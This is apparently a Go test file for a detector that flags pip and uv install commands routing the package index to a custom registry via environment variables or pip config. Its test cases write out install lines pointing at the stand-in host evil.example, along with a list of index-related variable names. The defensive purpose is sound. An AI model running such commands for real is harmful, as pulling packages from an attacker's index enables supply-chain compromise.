package installread

import (
	"slices"
	"testing"
)

// READER-VAR-OPT-1 round 5 (ADR-0159 round 11): pip's and uv's index options through the environment and pip's config,
// by the names their parsers read (pyIndexEnv, generated). Placeholders zz-var-pkg and evil.example only.

func TestReaderVarOpt5IndexThroughTheEnvironment(t *testing.T) {
	for _, line := range []string{
		"PIP_PYPI_URL=https://evil.example/simple pip install zz-var-pkg",
		"env PIP_PYPI_URL=https://evil.example/simple pip install zz-var-pkg",
		"export PIP_FIND_LINKS=/srv/wheels && pip install zz-var-pkg",
		"PIP_EXTRA_INDEX_URL=https://evil.example/simple python3 -m pip install zz-var-pkg",
		"UV_INDEX=https://evil.example/simple uv pip install zz-var-pkg",
		"UV_DEFAULT_INDEX=https://evil.example/simple uvx zz-var-pkg",
		"UV_FIND_LINKS=/srv/wheels uv tool install zz-var-pkg",
		"pip config set install.pypi_url https://evil.example/simple && pip install zz-var-pkg", // "_" is "-" to pip
		"pip config --user set global.extra-index-url https://evil.example/simple && pip install zz-var-pkg",
		"pip config set GLOBAL.find-links /srv/wheels && pip install zz-var-pkg",
	} {
		if _, codes := codesOn(line); !slices.Contains(codes, "custom_registry") {
			t.Errorf("%q: codes %v, want custom_registry", line, codes)
		}
	}
	for _, line := range []string{
		"PIP_PYPI_URL=https://pypi.org/simple pip install zz-var-pkg", // the public index
		// pip install reads [global] and [install] only: a key in another command's section does not reach it
		"pip config set download.pypi-url https://evil.example/simple && pip install zz-var-pkg",
	} {
		if tg, codes := codesOn(line); slices.Contains(codes, "custom_registry") || !slices.Equal(tg, []string{"pypi:zz-var-pkg"}) {
			t.Errorf("%q: targets %v, codes %v; want a plain install", line, tg, codes)
		}
	}
}

// An MCP entry's environment is read through the same names (EnvUnread), and the generated set has every name pip and
// uv read their index options from.
func TestReaderVarOpt5IndexEnvSet(t *testing.T) {
	if len(EnvUnread(map[string]string{"PIP_PYPI_URL": "https://evil.example/simple"})) == 0 {
		t.Error("an MCP entry with PIP_PYPI_URL: no reason")
	}
	for _, n := range []string{"PIP_INDEX_URL", "PIP_PYPI_URL", "PIP_EXTRA_INDEX_URL", "PIP_FIND_LINKS", "UV_INDEX",
		"UV_DEFAULT_INDEX", "UV_INDEX_URL", "UV_EXTRA_INDEX_URL", "UV_FIND_LINKS"} {
		if !IndexEnv[n] || envLevers[n] != lvSource {
			t.Errorf("%s: in IndexEnv %v, a source lever %v", n, IndexEnv[n], envLevers[n] == lvSource)
		}
	}
	for _, n := range []string{"PIP_NO_INDEX", "UV_INDEX_STRATEGY", "PIP_TRUSTED_HOST"} {
		if IndexEnv[n] {
			t.Errorf("%s: in IndexEnv, but it names no index", n)
		}
	}
}

// The first reader (ParseLine, what install_check reads) gives the reason itself, not only the second: a VAR=value
// prefix, export and cmd.exe's set, in any case (Windows' environment ignores case, and Python upper-cases its keys).
func TestReaderVarOpt5FirstReaderIndexEnv(t *testing.T) {
	for _, line := range []string{
		"PIP_PYPI_URL=https://evil.example/simple pip install zz-var-pkg",
		"UV_INDEX=https://evil.example/simple uv pip install zz-var-pkg",
		"UV_FIND_LINKS=/srv/wheels uvx zz-var-pkg",
		"set pip_pypi_url=https://evil.example/simple && pip install zz-var-pkg",
	} {
		_, unread, _, _ := ParseLine(line)
		if !slices.ContainsFunc(unread, func(u string) bool { return UnreadCode(u) == "custom_registry" }) {
			t.Errorf("%q: first reader %q, want custom_registry", line, unread)
		}
	}
}
